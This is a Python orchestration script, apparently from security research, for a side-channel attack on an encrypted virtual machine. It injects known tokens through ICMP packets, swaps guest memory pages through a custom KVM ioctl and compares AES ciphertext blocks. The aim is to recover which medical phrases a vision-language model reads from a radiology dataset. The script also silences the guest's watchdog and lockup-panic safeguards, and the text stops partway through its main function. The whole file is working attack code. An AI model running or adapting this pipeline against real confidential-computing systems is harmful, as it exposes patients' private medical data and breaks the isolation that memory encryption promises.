#!/usr/bin/env python3
"""
orchestrate.py — LLM token side-channel pipeline.

Flow:
  1. Clear guest dmesg
  2. Send ICMP via send_tokens.py → guest module logs GPA_token to dmesg
  3. read_gpa.py(GPA_token)  → cp.out   (token page ciphertext before swap)
  4. swap_pages_tool GPA_token ↔ GPA_indication --swap-back  (atomic kernel round-trip)
     KVM_READ_PAGE_DUMP ioctl  → gpa.out (post-swap ciphertext from kernel buffer)
  5. verify.py cp.out gpa.out

Usage:
    sudo python3 orchestrate.py --indication-gpa 0x3b0506498 --token-idx 0
    sudo python3 orchestrate.py --indication-gpa 0x3b0506498 --token-idx 0 \\
        --token-gpa 0x11603a000    # skip guest dmesg parsing
"""

import argparse
import csv
import ctypes
import datetime
import fcntl
import os
import re
import subprocess
import sys
import threading
import time
from pathlib import Path

HERE = Path(__file__).parent

# SSH to guest (same config as parent orchestrate.py)
GUEST_SSH  = "ubuntu@localhost"
GUEST_PORT = "7777"
_sudo_user = os.environ.get("SUDO_USER")
_ssh_key   = (Path(f"/home/{_sudo_user}/.ssh/id_ed25519")
              if _sudo_user else Path.home() / ".ssh/id_ed25519")
SSH_BASE   = [
    "ssh", "-p", GUEST_PORT,
    "-i", str(_ssh_key),
    "-o", "StrictHostKeyChecking=no",
    "-o", "BatchMode=yes",
    "-o", "ConnectTimeout=30",
    GUEST_SSH,
]

RESULTS_CSV_TMPL = HERE / "results_token{}.csv"
SWAP_TOOL   = HERE / "swap_pages_tool"
READ_GPA    = HERE / "read_gpa.py"
SEND_TOKENS = HERE / "send_tokens.py"
TOKEN_FIND  = HERE / "token_find.py"
VERIFY      = HERE / "verify.py"

# ---------------------------------------------------------------------------
# KVM_READ_PAGE_DUMP ioctl — reads post-swap ciphertext from kernel buffer.
# The kernel fills this buffer during the atomic --swap-back operation, so the
# guest never sees the swapped RMP state (no KVM_SYSTEM_EVENT_SEV_TERM risk).
# ---------------------------------------------------------------------------

KVM_DEV    = "/dev/kvm"
PAGE_SIZE  = 4096
_KVMIO     = 0xAE

def _ior(t, nr, size):
    return (0x80000000 | ((size & 0x3FFF) << 16) | (t << 8) | nr)

KVM_READ_PAGE_DUMP = _ior(_KVMIO, 0x2b, PAGE_SIZE)


def _read_page_dump(kvm_fd: int) -> bytes:
    buf = ctypes.create_string_buffer(PAGE_SIZE)
    fcntl.ioctl(kvm_fd, KVM_READ_PAGE_DUMP, buf)
    return bytes(buf)


def _bytes_to_xp_dump(gpa: int, raw: bytes) -> str:
    lines = [f'(qemu) xp /512gx 0x{gpa:x}']
    for i in range(0, PAGE_SIZE, 16):
        addr = gpa + i
        lo = int.from_bytes(raw[i:i+8],    'little')
        hi = int.from_bytes(raw[i+8:i+16], 'little')
        lines.append(f'{addr:016x}: 0x{lo:016x} 0x{hi:016x}')
    return '\n'.join(lines)


def do_swap_and_read(swap_tool: str, gpa_a: int, gpa_b: int, out_path: Path) -> None:
    """Atomic swap+copy+swap-back entirely within svm_vcpu_run(), then read the
    captured ciphertext from the kernel buffer.  The guest never sees the
    swapped RMP state, eliminating KVM_SYSTEM_EVENT_SEV_TERM crashes."""
    kvm_fd = os.open(KVM_DEV, os.O_RDWR | os.O_CLOEXEC)
    try:
        run("swap_pages_tool (atomic --swap-back)",
            [swap_tool, f"0x{gpa_a:x}", f"0x{gpa_b:x}", "--swap-back"])
        raw = _read_page_dump(kvm_fd)
    finally:
        os.close(kvm_fd)
    with open(out_path, 'w') as f:
        f.write(_bytes_to_xp_dump(gpa_a, raw) + '\n')


# ---------------------------------------------------------------------------
# helpers
# ---------------------------------------------------------------------------

def ssh(cmd: str, timeout: int = 15) -> str:
    try:
        r = subprocess.run(SSH_BASE + [cmd], capture_output=True, text=True, timeout=timeout)
        return r.stdout + r.stderr
    except subprocess.TimeoutExpired:
        return ""


GUEST_SCRIPT_DEFAULT  = "~/medical_ml/med_vlm/scripts/single_inference_indication_gpa.py"
GUEST_CWD_DEFAULT     = "~/medical_ml/med_vlm/scripts"
GUEST_DATASET_DEFAULT = "~/medical_ml/med_vlm/rexgradient/ReXGradient/metadata/rexgradient_test.json"
GUEST_PYTHON_DEFAULT  = "/home/ubuntu/miniconda3/envs/vlm/bin/python3"

# Kept in sync with send_tokens.py TOKENS dict — index → (label text, token IDs)
# Token IDs reflect full-prompt context: leading space from "Reason: ", and
# indications ending with "." get ".." (=496) because the template appends ".".
TOKEN_LABELS = [
    # Uppercase
    ("Chest pain",            [41771, 6646]),               # 0
    ("Shortness of breath",   [10698, 2090, 315, 11486]),   # 1
    # Lowercase
    ("chest pain",            [15138, 6646]),               # 2
    ("shortness of breath",   [2805, 2090, 315, 11486]),    # 3
]

# indication_tok_start = HEADER_CONST + N  (N = number of <|image_pad|> tokens)
# Measure once: orchestrate.py --calibrate-header-const --index <any> --token-idx <any>
HEADER_CONST: int | None = 43

IMAGE_PAD_TOKEN_ID  = 151654   # <|image_pad|> for Qwen2-VL
IMAGE_PAD_TOKEN_IDX = 4        # index in send_tokens.py TOKENS (after 4 existing labels 0-3)


def get_indication_text(index: int, dataset_path: str = GUEST_DATASET_DEFAULT) -> str | None:
    """Return the indication text for the given dataset index via SSH to the guest."""
    script = f"""
import json, os
with open(os.path.expanduser("{dataset_path}")) as f:
    raw = f.read().strip()
data = json.loads(raw) if raw.startswith("[") else [json.loads(l) for l in raw.splitlines() if l.strip()]
if {index} < len(data):
    print(data[{index}].get("indication", ""))
"""
    proc = subprocess.Popen(
        SSH_BASE + ["python3 -"],
        stdin=subprocess.PIPE, stdout=subprocess.PIPE,
        stderr=subprocess.PIPE, text=True,
    )
    stdout, _ = proc.communicate(input=script)
    return stdout.strip() if proc.returncode == 0 and stdout.strip() else None


def find_target_token_offset(indication_text: str, target_ids: list,
                              model_path: str,
                              python: str = GUEST_PYTHON_DEFAULT) -> int:
    """Tokenize indication_text on the guest and return the byte offset
    (token_index × 8) of the first occurrence of target_ids. Returns -1 if not found."""
    script = f"""
import sys
try:
    from transformers import AutoTokenizer
    tok = AutoTokenizer.from_pretrained({model_path!r}, trust_remote_code=True)
    tokens = tok({indication_text!r}, add_special_tokens=False)['input_ids']
    target = {target_ids!r}
    # Try exact match first; fall back to prefix search (last token is
    # context-dependent: standalone "." = 13, but in full prompt ".." = 496).
    for search in (target, target[:-1]):
        n = len(search)
        for i in range(len(tokens) - n + 1):
            if tokens[i:i+n] == search:
                print(i * 8)
                sys.exit(0)
    print(-1)
except Exception:
    import traceback; traceback.print_exc(file=sys.stderr)
    print(-1)
"""
    proc = subprocess.Popen(
        SSH_BASE + [f"{python} -"],
        stdin=subprocess.PIPE, stdout=subprocess.PIPE,
        stderr=subprocess.PIPE, text=True,
    )
    try:
        stdout, stderr = proc.communicate(input=script, timeout=180)
    except subprocess.TimeoutExpired:
        proc.kill()
        proc.wait()
        print("  [tokenizer] timeout — using raw GPA", file=sys.stderr)
        return -1
    if stderr.strip():
        print(f"  [tokenizer] stderr: {stderr.strip()}", file=sys.stderr)
    try:
        return int(stdout.strip())
    except ValueError:
        return -1


def scan_matching_indices(token_idx: int,
                          dataset_path: str = GUEST_DATASET_DEFAULT) -> list:
    """Return dataset indices whose indication field contains the token_idx label."""
    if token_idx < 0 or token_idx >= len(TOKEN_LABELS):
        print(f"[!] token_idx {token_idx} out of range (0..{len(TOKEN_LABELS)-1})",
              file=sys.stderr)
        sys.exit(1)
    label, _ = TOKEN_LABELS[token_idx]
    print(f"[scan] Scanning for '{label}' in indication field (dataset: {dataset_path})...")

    scan_script = f"""
import json, os, sys
with open(os.path.expanduser("{dataset_path}")) as f:
    raw = f.read().strip()
data = json.loads(raw) if raw.startswith("[") else [json.loads(l) for l in raw.splitlines() if l.strip()]
label = {label!r}
for i, s in enumerate(data):
    if label in (s.get("indication") or ""):
        print(i)
"""
    proc = subprocess.Popen(
        SSH_BASE + ["python3 -"],
        stdin=subprocess.PIPE, stdout=subprocess.PIPE,
        stderr=subprocess.PIPE, text=True,
    )
    stdout, stderr = proc.communicate(input=scan_script)
    if proc.returncode != 0:
        print(f"[!] scan failed:\n{stderr}", file=sys.stderr)
        sys.exit(1)
    indices = [int(x) for x in stdout.strip().splitlines() if x.strip().isdigit()]
    print(f"[scan] {len(indices)} samples found: {indices[:10]}{'...' if len(indices) > 10 else ''}")
    return indices


_GPA_TIMEOUT = 150  # seconds to wait for guest GPA output before killing


def acquire_indication_gpa(index: int, script: str = GUEST_SCRIPT_DEFAULT,
                            cwd: str = GUEST_CWD_DEFAULT,
                            python: str = GUEST_PYTHON_DEFAULT,
                            calibrate: bool = False,
                            swap_tool: str | None = None):
    """Run single_inference_indication_gpa.py --gpa-only on the guest via SSH.

    Guest prints:
      input_ids base GPA: 0x<hex>
      input_ids base page GPA: 0x<hex>   (page-aligned)
      N_image_pad: <int>
      [calibrate mode only] HEADER_CONST_HINT: <int>

    Host computes indication_gpa via one of two methods:
      HEADER_CONST set : indication_gpa = base_gpa + (HEADER_CONST + N) * 8  (fast)
      HEADER_CONST None: image_pad ICMP scan on indication_page → image_pad_end_offset
                         indication_gpa ≈ indication_page + image_pad_end (±16 bytes;
                         use --try-all-phases to resolve the remaining alignment)

    Returns (indication_gpa, proc) in normal mode.
    Returns (header_const_hint, proc) in calibrate mode.
    proc.stdin is kept open to hold the input_ids tensor in guest memory.
    """
    if HEADER_CONST is None and not calibrate and swap_tool is None:
        print("[!] HEADER_CONST is not set. Either run --calibrate-header-const first "
              "or pass swap_tool so the image_pad scan can locate indication position.",
              file=sys.stderr)
        sys.exit(1)

    extra = " --calibrate" if calibrate else ""
    cmd = (f"source ~/miniconda3/etc/profile.d/conda.sh && conda activate vlm && "
           f"cd {cwd} && sudo -E {python} -u {script} --index {index} --gpa-only{extra}")
    print(f"  [guest] {cmd}")

    for attempt in range(3):
        proc = subprocess.Popen(
            SSH_BASE + [cmd],
            stdin=subprocess.PIPE, stdout=subprocess.PIPE,
            stderr=subprocess.PIPE, text=True,
        )
        result: dict = {}

        def _reader(stdout, out, cal=calibrate):
            for line in stdout:
                print(f"  [guest] {line}", end="", flush=True)
                m = re.search(r"input_ids base GPA:\s+0x([0-9a-f]+)", line, re.IGNORECASE)
                if m:
                    out["base_gpa"] = int(m.group(1), 16)
                m = re.search(r"input_ids base page GPA:\s+0x([0-9a-f]+)", line, re.IGNORECASE)
                if m:
                    out["base_page_gpa"] = int(m.group(1), 16)
                m = re.search(r"N_image_pad:\s+(\d+)", line)
                if m:
                    out["N"] = int(m.group(1))
                m = re.search(r"HEADER_CONST_HINT:\s+(\d+)", line)
                if m:
                    out["header_const_hint"] = int(m.group(1))
                got_base_n = "base_gpa" in out and "N" in out
                if cal:
                    if got_base_n and "header_const_hint" in out:
                        break
                else:
                    if got_base_n:
                        break

        t = threading.Thread(target=_reader, args=(proc.stdout, result), daemon=True)
        t.start()
        t.join(timeout=_GPA_TIMEOUT)

        if "base_gpa" in result and "N" in result:
            base_gpa      = result["base_gpa"]
            N             = result["N"]
            base_page_gpa = result.get("base_page_gpa", base_gpa & ~0xFFF)
            # Assume indication tokens are on the next page (valid for N < ~980)
            indication_page_gpa = base_page_gpa + 0x1000
            print(f"  [host] base_page_gpa=0x{base_page_gpa:x}"
                  f"  indication_page_gpa=0x{indication_page_gpa:x}  N={N}")

            if calibrate:
                return result.get("header_const_hint"), proc

            if HEADER_CONST is not None:
                tok_start      = HEADER_CONST + N
                indication_gpa = base_gpa + tok_start * 8
                print(f"  [host] tok_start={tok_start}"
                      f"  indication_gpa=0x{indication_gpa:x}")
                return indication_gpa, proc

            # HEADER_CONST is None → scan both pages with image_pad to derive N and position
            print("  [host] HEADER_CONST not set → scanning both pages with image_pad...")
            A = scan_image_pad_start(base_page_gpa, swap_tool)
            B = scan_image_pad_boundary(indication_page_gpa, swap_tool)
            if A is None or B is None:
                print("[!] image_pad scan failed — cannot determine indication_gpa",
                      file=sys.stderr)
                try:
                    proc.kill()
                except Exception:
                    pass
                proc.wait()
                return None, None
            # N = total image_pad bytes / 8; (4096-A) on base_page + B on indication_page
            N_scan = (4096 - A + B) // 8
            N_guest = result.get("N")
            if N_guest is not None:
                print(f"  [host] A=0x{A:x}  B=0x{B:x}"
                      f"  N_scan={N_scan}  N_guest={N_guest}  Δ={N_scan - N_guest:+d}")
            else:
                print(f"  [host] A=0x{A:x}  B=0x{B:x}  N_scan={N_scan}")
            # indication_gpa ≈ indication_page + B; --try-all-phases covers ±(1+P)×8 gap
            indication_gpa = indication_page_gpa + B
            print(f"  [host] indication_gpa ≈ 0x{indication_gpa:x}"
                  f"  (±(1+P)×8 bytes; use --try-all-phases)")
            return indication_gpa, proc

        # Timed out or process died before printing required fields — kill and retry
        timed_out = t.is_alive()
        try:
            proc.kill()
        except Exception:
            pass
        try:
            stderr_out = proc.stderr.read()
        except Exception:
            stderr_out = ""
        proc.wait()

        missing = [k for k in ("base_gpa", "N") if k not in result]
        if timed_out:
            print(f"[!] GPA timeout ({_GPA_TIMEOUT}s) index={index} ({attempt+1}/3)",
                  file=sys.stderr)
        else:
            print(f"[!] GPA failed index={index} missing={missing} ({attempt+1}/3)",
                  file=sys.stderr)
        if stderr_out:
            print(f"[!] guest stderr:\n{stderr_out}", file=sys.stderr)
        if attempt < 2:
            print(f"  [auto] Retrying in 15s (waiting for guest memory reclaim)...",
                  file=sys.stderr)
            time.sleep(15)
    return None, None


def acquire_token_gpa(token_idx: int, prefix: int = 0) -> tuple:
    """Send one ICMP packet and parse GPA_token + frag offset from guest dmesg.
    Returns (gpa, frag_p1_payload_offset) where frag_p1_payload_offset is the
    number of ICMP payload bytes in sub-page[0] (= bytes before sub-page[1] starts)."""
    print("  [auto] Clearing guest dmesg...")
    ssh("sudo dmesg -C")

    cmd = [sys.executable, str(SEND_TOKENS), str(token_idx), "1"]
    if prefix:
        cmd += ["--prefix", str(prefix)]
    print(f"  [auto] Sending {' '.join(str(c) for c in cmd)}...")
    subprocess.run(cmd, check=True)
    time.sleep(1)

    print("  [auto] Parsing GPA from guest dmesg...")
    gpas = []
    out = ""
    for attempt in range(3):
        out = ssh("sudo dmesg", timeout=40)
        gpas = re.findall(r"sub-page\[\d+\]\s+GPA=0x([0-9a-f]+)", out, re.IGNORECASE)
        if gpas:
            break
        if attempt < 2:
            print(f"  [auto] No GPA found, retrying in 3s ({attempt+1}/3)...")
            time.sleep(3)
    if not gpas:
        print("[!] No GPA found in guest dmesg. Output:", file=sys.stderr)
        print(out, file=sys.stderr)
        sys.exit(1)

    gpa = int(gpas[-1], 16)   # use the most recent GPA (sub-page[1])
    print(f"  GPA_token = 0x{gpa:x}")

    # Parse frag off to compute FRAG_P1_PAYLOAD_OFFSET dynamically.
    # kprobe prints: frag[0]: compound_GPA=0x... off=NNNN size=...
    # ICMP payload bytes in sub-page[0] = 4096 - (off % 4096) - 8 (ICMP header)
    frag_p1_payload_offset = 970  # fallback: assumes off%4096=3118
    m = re.search(r"frag\[0\].*?\boff=(\d+)", out)
    if m:
        frag_off = int(m.group(1))
        frag_offset_in_page = frag_off % 4096
        frag_p1_payload_offset = 4096 - frag_offset_in_page - 8
        print(f"  frag off={frag_off}  off%%4096={frag_offset_in_page}"
              f"  → FRAG_P1_PAYLOAD_OFFSET={frag_p1_payload_offset}")
    else:
        print(f"  [!] frag off not found in dmesg — using fallback FRAG_P1_PAYLOAD_OFFSET={frag_p1_payload_offset}",
              file=sys.stderr)

    return gpa, frag_p1_payload_offset


def is_guest_alive() -> bool:
    """Check guest liveness via SSH."""
    try:
        r = subprocess.run(SSH_BASE + ["true"],
                           capture_output=True, timeout=20)
        return r.returncode == 0
    except Exception:
        return False


def run(label: str, cmd: list) -> None:
    print(f"  $ {' '.join(str(c) for c in cmd)}")
    rc = subprocess.run(cmd).returncode
    if rc != 0:
        print(f"[!] {label} failed (exit {rc})", file=sys.stderr)
        sys.exit(1)


def do_swap(swap_tool: str, gpa_a: int, gpa_b: int) -> None:
    run("swap_pages_tool", [swap_tool, f"0x{gpa_a:x}", f"0x{gpa_b:x}"])


def do_read(idx: str, gpa: int) -> Path:
    out = HERE / f"{idx}.out"
    run("read_gpa", [sys.executable, str(READ_GPA), idx, f"0x{gpa:x}"])
    return out


def do_verify(cp_out: Path, gpa_out: Path, token_offset: int, token_ids: str) -> bool:
    r = subprocess.run([
        sys.executable, str(VERIFY), "verify",
        "--cp",           str(cp_out),
        "--post",         str(gpa_out),
        "--token-offset", hex(token_offset),
        "--token-ids",    token_ids,
    ], capture_output=True, text=True)
    print(r.stdout, end="")
    return "MATCH ✓" in r.stdout


def _parse_xp_dump(path: Path) -> list[bytes]:
    """Parse xp-format dump → list of 16-byte AES blocks (256 for a 4 KB page)."""
    blocks = []
    with open(path) as f:
        for line in f:
            m = re.match(r'[0-9a-f]+:\s+0x([0-9a-f]{16})\s+0x([0-9a-f]{16})', line.strip())
            if m:
                lo = int(m.group(1), 16).to_bytes(8, 'little')
                hi = int(m.group(2), 16).to_bytes(8, 'little')
                blocks.append(lo + hi)
    return blocks


def scan_image_pad_boundary(indication_page_gpa: int, swap_tool: str) -> int | None:
    """Fill an ICMP ring-buffer page with <|image_pad|> tokens and swap with indication_page.
    Compares all 256 AES blocks to find the last MATCH block → image_pad_end_offset.

    Because image_pad is an 8-byte repeating token and AES blocks are 16 bytes, the ring
    buffer must be 16-byte aligned with the indication page's image_pad sequence.
    A single probe with prefix=0 reveals frag_p1 % 16; the actual scan uses that as prefix
    so both pages start at the same position mod-16 within the image_pad pattern.

    Returns the byte offset within indication_page where image_pad ends (±16 bytes),
    or None on failure.
    """
    print("\n[image_pad scan] Probing ring-buffer alignment...")
    _, frag_p1_probe = acquire_token_gpa(IMAGE_PAD_TOKEN_IDX, prefix=0)
    align_prefix = frag_p1_probe % 16
    print(f"  frag_p1_probe={frag_p1_probe}  align_prefix={align_prefix}")

    print(f"[image_pad scan] Sending image_pad ICMP (prefix={align_prefix})...")
    token_gpa, frag_p1 = acquire_token_gpa(IMAGE_PAD_TOKEN_IDX, prefix=align_prefix)

    # Byte offset within ring-buffer page where image_pad sequence begins
    if frag_p1 <= align_prefix:
        imgpad_start = align_prefix - frag_p1   # prefix zeros fill the head
    else:
        imgpad_start = 0                         # page starts inside image_pad payload

    print(f"  token_gpa=0x{token_gpa:x}  frag_p1={frag_p1}  imgpad_start={imgpad_start}")

    cp_out  = HERE / "imgpad_cp.out"
    gpa_out = HERE / "imgpad_gpa.out"

    print(f"[image_pad scan] Pre-swap dump → {cp_out.name}")
    run("read_gpa (image_pad scan)", [sys.executable, str(READ_GPA), "imgpad_cp", f"0x{token_gpa:x}"])

    print(f"[image_pad scan] Atomic swap+read: 0x{token_gpa:x} ↔ 0x{indication_page_gpa:x}")
    do_swap_and_read(swap_tool, token_gpa, indication_page_gpa, gpa_out)

    print("[image_pad scan] Comparing AES blocks...")
    cp_blocks  = _parse_xp_dump(cp_out)
    gpa_blocks = _parse_xp_dump(gpa_out)

    if len(cp_blocks) != 256 or len(gpa_blocks) != 256:
        print(f"[!] Unexpected block count: cp={len(cp_blocks)} gpa={len(gpa_blocks)}",
              file=sys.stderr)
        return None

    first_imgpad_block = imgpad_start // 16
    last_match = -1
    in_match_run = False
    for i in range(first_imgpad_block, 256):
        if cp_blocks[i] == gpa_blocks[i]:
            last_match = i
            in_match_run = True
        elif in_match_run:
            break  # first MISMATCH after match run = boundary

    if last_match < 0:
        print("[!] No matching AES blocks found — check indication_page GPA or alignment",
              file=sys.stderr)
        return None

    image_pad_end = (last_match + 1) * 16
    matching = sum(1 for i in range(first_imgpad_block, 256) if cp_blocks[i] == gpa_blocks[i])
    print(f"  first_imgpad_block={first_imgpad_block}  last_match_block={last_match}")
    print(f"  matching blocks: {matching}")
    print(f"  image_pad_end ≈ 0x{image_pad_end:x}  (±16 bytes, within indication_page)")
    return image_pad_end


def scan_image_pad_start(base_page_gpa: int, swap_tool: str) -> int | None:
    """Scan base_page to find where image_pad tokens BEGIN (MISMATCH→MATCH boundary = A).

    image_pad token = 151654; as int64 LE both halves of every 16-byte AES block are
    identical, so any 8-byte aligned starting position in the repeating pattern gives the
    same block bytes.  align_prefix = frag_p1 % 8 guarantees 8-byte alignment.

    For typical N the image_pad run spans base_page entirely to its end (spills into
    indication_page), so matches should reach block 255.  If last_match < 250 the image
    is unusually small — a warning is printed but A is still returned.

    Returns byte offset A within base_page (±16 bytes), or None on failure.
    """
    print(f"\n[base scan] Finding image_pad start on base_page 0x{base_page_gpa:x}...")
    _, frag_p1_probe = acquire_token_gpa(IMAGE_PAD_TOKEN_IDX, prefix=0)
    align_prefix = frag_p1_probe % 8
    print(f"  frag_p1_probe={frag_p1_probe}  align_prefix={align_prefix}")

    token_gpa, frag_p1 = acquire_token_gpa(IMAGE_PAD_TOKEN_IDX, prefix=align_prefix)
    imgpad_start = (align_prefix - frag_p1) if frag_p1 <= align_prefix else 0
    print(f"  token_gpa=0x{token_gpa:x}  frag_p1={frag_p1}  imgpad_start={imgpad_start}")

    cp_out  = HERE / "base_cp.out"
    gpa_out = HERE / "base_gpa.out"

    print(f"[base scan] Pre-swap dump → {cp_out.name}")
    run("read_gpa (base scan)", [sys.executable, str(READ_GPA), "base_cp", f"0x{token_gpa:x}"])

    print(f"[base scan] Atomic swap+read: 0x{token_gpa:x} ↔ 0x{base_page_gpa:x}")
    do_swap_and_read(swap_tool, token_gpa, base_page_gpa, gpa_out)

    print("[base scan] Comparing AES blocks...")
    cp_blocks  = _parse_xp_dump(cp_out)
    gpa_blocks = _parse_xp_dump(gpa_out)

    if len(cp_blocks) != 256 or len(gpa_blocks) != 256:
        print(f"[!] Unexpected block count: cp={len(cp_blocks)} gpa={len(gpa_blocks)}",
              file=sys.stderr)
        return None

    first_imgpad_block = imgpad_start // 16
    first_match = next((i for i in range(first_imgpad_block, 256)
                        if cp_blocks[i] == gpa_blocks[i]), None)
    if first_match is None:
        print("[!] No matching AES blocks on base_page — check GPA or alignment",
              file=sys.stderr)
        return None

    last_match = max(i for i in range(256) if cp_blocks[i] == gpa_blocks[i])
    n_matches  = sum(1 for i in range(256) if cp_blocks[i] == gpa_blocks[i])
    print(f"  first_match_block={first_match}  last_match_block={last_match}"
          f"  n_matches={n_matches}")

    if last_match < 250:
        print(f"  [!] last_match={last_match} < 250 — very small image or page mismatch?",
              file=sys.stderr)

    A = first_match * 16
    print(f"  image_pad_start A ≈ 0x{A:x}  (±16 bytes, within base_page)")
    return A


def try_all_phases(
    token_idx: int,
    indication_page_gpa: int,
    token_offset: int,
    token_ids: str,
    swap_tool: str,
    n_phases: int = 32,
) -> int | None:
    """Try prefix 0..n_phases-1 in order.
    Returns the matching prefix, or None if none found.
    Each iteration does swap → compare → swap-back to restore the indication page."""
    print(f"\n[all-phases] Trying prefix 0..{n_phases-1}")
    print(f"  indication_page_gpa = 0x{indication_page_gpa:x}")
    print(f"  token_offset        = 0x{token_offset:x}")
    print(f"  token_ids           = {token_ids}")
    print()

    for prefix in range(n_phases):
        print(f"── prefix={prefix:2d} " + "─" * 44)

        # 1. Fresh cp page — clear dmesg then send
        ssh("sudo dmesg -C")
        cmd = [sys.executable, str(SEND_TOKENS), str(token_idx), "1",
               "--prefix", str(prefix)]
        subprocess.run(cmd, check=True)
        time.sleep(0.5)

        out = ssh("sudo dmesg")
        gpas = re.findall(r"sub-page\[\d+\]\s+GPA=0x([0-9a-f]+)", out, re.IGNORECASE)
        if not gpas:
            print(f"  [!] No GPA, skipping")
            continue
        token_gpa = int(gpas[-1], 16)
        m = re.search(r"frag\[0\].*?\boff=(\d+)", out)
        if m:
            frag_off = int(m.group(1))
            frag_p1 = 4096 - (frag_off % 4096) - 8
            print(f"  GPA_token = 0x{token_gpa:x}  frag_p1={frag_p1}")
        else:
            print(f"  GPA_token = 0x{token_gpa:x}")

        # 2. Pre-swap dump
        cp_out  = do_read(f"cp_p{prefix}", token_gpa)

        # 3. Atomic swap+copy+swap-back — guest never sees swapped state
        gpa_out = HERE / f"gpa_p{prefix}.out"
        do_swap_and_read(swap_tool, token_gpa, indication_page_gpa, gpa_out)

        # 4. Compare
        matched = do_verify(cp_out, gpa_out, token_offset, token_ids)

        if matched:
            print(f"\n[all-phases] Match at prefix={prefix}")
            print(f"  O_icmp % 32 = {(token_offset - prefix) % 32}")
            print(f"  → Use --prefix {prefix} for subsequent runs")
            return prefix

    print("\n[all-phases] No match across all 32 prefixes — wrong token or other issue")
    return None


# ---------------------------------------------------------------------------
# main
# ---------------------------------------------------------------------------

def ensure_mtu_9000():
    """Set MTU 9000 on host TAP and guest ICMP interface to prevent IP fragmentation.
    Without jumbo frames, 4097-byte ICMP payloads fragment; reassembled skbs use
    frag_list (not skb_shinfo->frags), so guest_large_icmp_monitor misses the GPAs."""
    r = subprocess.run(["ip", "route", "get", "192.168.100.2"],
                       capture_output=True, text=True)
    m = re.search(r'\bdev\s+(\S+)', r.stdout)
    if m:
        host_iface = m.group(1)
        cur = subprocess.run(["ip", "link", "show", host_iface],
                             capture_output=True, text=True).stdout
        if "mtu 9000" not in cur:
            subprocess.run(["ip", "link", "set", host_iface, "mtu", "9000"], check=True)
            print(f"[mtu] host {host_iface} → 9000")
        else:
            print(f"[mtu] host {host_iface} already 9000")
    else:
        print("[mtu] WARNING: could not determine host interface", file=sys.stderr)

    out = ssh("ip -o addr show | awk '/192\\.168\\.100\\.2/{print $2}'")
    guest_iface = out.strip() or "enp0s4"
    result = ssh(f"ip link show {guest_iface}")
    if "mtu 9000" not in result:
        ssh(f"sudo ip link set {guest_iface} mtu 9000")
        print(f"[mtu] guest {guest_iface} → 9000")
    else:
        print(f"[mtu] guest {guest_iface} already 9000")


def main() -> None:
    # vCPU is frozen by the host during KVM_SWAP_GUEST_PAGES, which can trigger
    # soft-lockup / RCU stall warnings and panics inside the guest — suppress them.
    # THP: 2 MB huge pages cause an RMP size mismatch with 4 KB swaps → SEV_TERM.
    ssh("echo 0 | sudo tee /proc/sys/kernel/watchdog > /dev/null 2>&1 ; "
        "echo 0 | sudo tee /proc/sys/kernel/nmi_watchdog > /dev/null 2>&1 ; "
        "echo 0 | sudo tee /proc/sys/kernel/softlockup_panic > /dev/null 2>&1 ; "
        "echo 0 | sudo tee /proc/sys/kernel/hardlockup_panic > /dev/null 2>&1 ; "
        "echo 1 | sudo tee /proc/sys/kernel/rcu_cpu_stall_suppress > /dev/null 2>&1 ; "
        "echo never | sudo tee /sys/kernel/mm/transparent_hugepage/enabled > /dev/null 2>&1",
        timeout=30)

    ensure_mtu_9000()

    p = argparse.ArgumentParser(
        description=__doc__,
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    p.add_argument("--indication-gpa", default=None,
                   help="Indication start GPA (hex) — mutually exclusive with --index")
    p.add_argument("--index", type=int, default=None,
                   help="Dataset index: auto-acquire indication GPA from guest")
    p.add_argument("--guest-script", default=GUEST_SCRIPT_DEFAULT,
                   help="Path to single_inference_indication_gpa.py on guest")
    p.add_argument("--guest-cwd", default=GUEST_CWD_DEFAULT,
                   help="Working directory on guest")
    p.add_argument("--guest-python", default=GUEST_PYTHON_DEFAULT,
                   help="Python interpreter on guest (conda env)")
    p.add_argument("--guest-dataset", default=GUEST_DATASET_DEFAULT,
                   help="Path to rexgradient_test.json on guest")
    p.add_argument("--all-matching", action="store_true",
                   help="Iterate over all dataset samples whose indication contains "
                        "the --token-idx label")
    p.add_argument("--token-idx", required=False, type=int, default=None,
                   help="Token index to pass to send_tokens.py")
    p.add_argument("--header-const", type=int, default=None,
                   help="HEADER_CONST override (indication_tok_start = HEADER_CONST + N)")
    p.add_argument("--calibrate-header-const", action="store_true",
                   help="Measure HEADER_CONST_HINT on guest and exit (requires --index)")
    p.add_argument("--token-gpa", default=None,
                   help="GPA_token (hex) — skip auto-detection from guest dmesg")
    p.add_argument("--cp-out",  default=str(HERE / "cp.out"),
                   help="Pre-swap dump path (default: cp.out)")
    p.add_argument("--gpa-out", default=str(HERE / "gpa.out"),
                   help="Post-swap dump path (default: gpa.out)")
    p.add_argument("--prefix", type=int, default=0, metavar="N",
                   help="send_tokens.py --prefix N (fixed alignment, mutually exclusive "
                        "with --try-all-phases)")
    p.add_argument("--token-ids", default=None,
                   help="Token IDs (comma-separated). Auto-derived from --token-idx if omitted.")
    p.add_argument("--try-all-phases", action="store_true",
                   help="Try prefix 0..31 to auto-detect correct alignment")
    p.add_argument("--guest-model-path", default=None,
                   help="Path to model on guest (for tokenizer) — needed when indication "
                        "has multiple phrases, e.g. '3-year-old female with shortness of breath.'")
    p.add_argument("--monitor-sock", default="/tmp/qemu-monitor.sock")
    p.add_argument("--swap-tool", default=str(SWAP_TOOL))
    args = p.parse_args()

    # ── HEADER_CONST override / calibration ──────────────────────────────────
    global HEADER_CONST
    if args.header_const is not None:
        HEADER_CONST = args.header_const

    if args.calibrate_header_const:
        if args.index is None:
            p.error("--calibrate-header-const requires --index")
        print(f"\n[calibrate] Measuring HEADER_CONST for index={args.index}...")
        hint, proc = acquire_indication_gpa(
            args.index, args.guest_script, args.guest_cwd, args.guest_python,
            calibrate=True)
        if proc is not None:
            try:
                proc.stdin.close()
                proc.wait(timeout=10)
            except Exception:
                proc.kill()
        if hint is not None:
            print(f"\n[calibrate] HEADER_CONST = {hint}")
            print(f"[calibrate] Set HEADER_CONST = {hint} in orchestrate.py, or")
            print(f"[calibrate] pass --header-const {hint} on each run.")
        else:
            print("[calibrate] HEADER_CONST measurement failed.", file=sys.stderr)
            sys.exit(1)
        return

    # Auto-derive token_ids from token_idx
    if args.token_ids is None:
        if args.token_idx is None or args.token_idx < 0 or args.token_idx >= len(TOKEN_LABELS):
            p.error(f"--token-idx must be in range 0..{len(TOKEN_LABELS)-1}")
        _, ids = TOKEN_LABELS[args.token_idx]
        args.token_ids = ",".join(str(i) for i in ids)

